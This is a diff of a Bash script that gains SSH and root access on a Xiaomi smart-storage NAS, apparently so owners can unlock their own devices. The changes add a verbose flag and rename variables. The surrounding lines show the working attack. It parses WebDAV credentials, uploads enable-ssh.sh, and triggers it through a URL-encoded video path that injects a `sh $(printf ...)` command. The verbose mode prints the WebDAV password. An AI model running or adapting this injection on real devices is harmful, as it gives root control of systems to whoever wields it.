@@ -17,7 +17,14 @@ echo "#                                              #"
 echo "################################################"
 echo "小米智能存储一键开启 SSH + root    @Scruel 2026.08"
 echo "################################################"
-    
+
+
+VERBOSE=0
+# check arg -v, if present, set VERBOSE = True
+if [ $# -gt 0 ] && [ "$1" = "-v" ]; then
+    VERBOSE=1
+fi
+
 # ---------- 清理临时文件 ----------
 cleanup() {
     rm -f /tmp/enable-ssh.sh
@@ -25,9 +32,8 @@ cleanup() {
 trap cleanup EXIT
 
 check_commands() {
-    local cmds=("openssl" "curl" "ssh-keygen" "wslpath")
-    for cmd in "${cmds[@]}"; do
-        if ! command -v "$cmd" &>/dev/null; then
+    for cmd in openssl curl ssh-keygen wslpath; do
+        if ! command -v "$cmd" >/dev/null 2>&1; then
             echo "命令 '$cmd' 未找到，请安装后再试。" >&2
             exit 1
         fi
@@ -53,6 +59,9 @@ read_nas_ip() {
 echo "尝试自动获取小米智能存储的内网 IP..."
 NAS_IP=
 PREFIX=$(ip -4 addr show | grep -v 127.0.0 | grep inet | head -1 | awk '{print $2}' | cut -d/ -f1 | cut -d. -f1-3)
+if [ $VERBOSE -eq 1 ]; then
+    echo "PREFIX: $PREFIX"
+fi
 for i in {1..254}; do
     name=$(dig -x "$PREFIX.$i" +short 2>/dev/null)
     [[ "$name" =~ minas ]] && { NAS_IP="$PREFIX.$i"; break; }
@@ -138,14 +147,17 @@ if [[ -z "$RESP" ]]; then
     exit 1
 fi
 
-UNAME=$(echo "$RESP" | grep -o '"username":"[^"]*"' | sed 's/"username":"\(.*\)"/\1/' 2>/dev/null)
-UPWD=$(echo "$RESP" | grep -o '"password":"[^"]*"' | sed 's/"password":"\(.*\)"/\1/' 2>/dev/null)
-if [[ -z "$UNAME" || -z "$UPWD" ]]; then
+WDV_USER=$(echo "$RESP" | grep -o '"username":"[^"]*"' | sed 's/"username":"\(.*\)"/\1/' 2>/dev/null)
+WDV_PWD=$(echo "$RESP" | grep -o '"password":"[^"]*"' | sed 's/"password":"\(.*\)"/\1/' 2>/dev/null)
+if [[ -z "$WDV_USER" || -z "$WDV_PWD" ]]; then
     echo "无法解析 WebDAV 凭证。" >&2
     exit 1
 fi
-CREDS="$UNAME:$UPWD"
-echo "WebDAV 用户凭证解析成功: $UNAME"
+CREDS="$WDV_USER:$WDV_PWD"
+echo "WebDAV 用户凭证解析成功: $WDV_USER"
+if [ $VERBOSE -eq 1 ]; then
+    echo "WebDAV 密码: $WDV_PWD"
+fi
 
 # ---------- 生成 SSH 密钥 ----------
 if [[ -f "$HOME/.ssh/id_ed25519" && -f "$HOME/.ssh/id_ed25519.pub" ]]; then
@@ -176,9 +188,9 @@ systemctl enable dropbear.socket
 systemctl start dropbear.socket
 mitee_tool rpmb set ssh_en true
 
-touch /nas/pool0/$UNAME/data/SUCCESS
-chown $UNAME:$UNAME /nas/pool0/$UNAME/data/SUCCESS
-rm /nas/pool0/$UNAME/data/enable-ssh.sh
+touch /nas/pool0/$WDV_USER/data/SUCCESS
+chown $WDV_USER:$WDV_USER /nas/pool0/$WDV_USER/data/SUCCESS
+rm /nas/pool0/$WDV_USER/data/enable-ssh.sh
 EOF
 
 sed -i 's/\r$//' /tmp/enable-ssh.sh
@@ -199,7 +211,7 @@ echo "上传 enable-ssh.sh 脚本成功 (HTTP $HTTP_CODE)"
 
 # ---------- 触发执行 enable-ssh.sh ----------
 echo "请求执行 enable-ssh.sh 脚本..."
-P="/pool0/video/__X2%22%3Bsh%20%24%28printf%20%27%5C57nas%5C57pool0%5C57$UNAME%5C57data%5C57enable-ssh.sh%27%29%3B%22__.ts"
+P="/pool0/video/__X2%22%3Bsh%20%24%28printf%20%27%5C57nas%5C57pool0%5C57$WDV_USER%5C57data%5C57enable-ssh.sh%27%29%3B%22__.ts"
 curl -s -g -u "$CREDS" "${CERT_ARGS[@]}" --resolve "$CN:5000:$NAS_IP" "https://$CN:5000$P" -o /dev/null
 sleep 3
 
